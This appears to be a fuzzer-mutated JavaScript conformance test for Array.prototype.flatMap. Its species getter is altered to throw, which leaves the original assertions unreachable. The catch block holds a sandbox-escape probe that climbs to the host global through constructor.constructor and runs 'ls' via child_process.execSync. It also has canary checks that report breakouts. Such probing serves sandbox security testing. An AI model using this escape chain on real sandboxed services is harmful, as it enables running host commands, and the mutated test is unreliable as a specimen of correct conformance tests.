try {
    assert.sameValue(typeof Array.prototype.flatMap, 'function');
    var arr = [
        [
            42,
            1
        ],
        [
            42,
            2
        ]
    ];
    var mapperFn = function (e) {
        let REPLACER = 23;
        return e;
    };
    var called = 0;
    var ctorCalled = 0;
    function ctor(len) {
        let REPLACER = 23;
        assert.sameValue(new.target, ctor, 'new target is defined');
        assert.sameValue(len, 0, 'first argument is always 0');
        ctorCalled++;
    }
    arr.constructor = {
        get [Symbol.species]() {
            throw () => {
                return () => {
                };
            };
            called++;
            return ctor;
        }
    };
    var actual = arr.flatMap(mapperFn);
    assert(actual instanceof ctor, 'returned value is an instance of custom ctor');
    assert.sameValue(called, 1, 'got species once');
    assert.sameValue(ctorCalled, 1, 'called custom ctor once');
    assert.sameValue(Object.prototype.hasOwnProperty.call(actual, 'length'), false, 'it does not define an own length property');
    verifyProperty(actual, '0', {
        configurable: true,
        writable: true,
        enumerable: true,
        value: 42
    });
    verifyProperty(actual, '1', {
        configurable: true,
        writable: true,
        enumerable: true,
        value: 1
    });
    verifyProperty(actual, '2', {
        configurable: true,
        writable: true,
        enumerable: true,
        value: 42
    });
    verifyProperty(actual, '3', {
        configurable: true,
        writable: true,
        enumerable: true,
        value: 2
    });
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}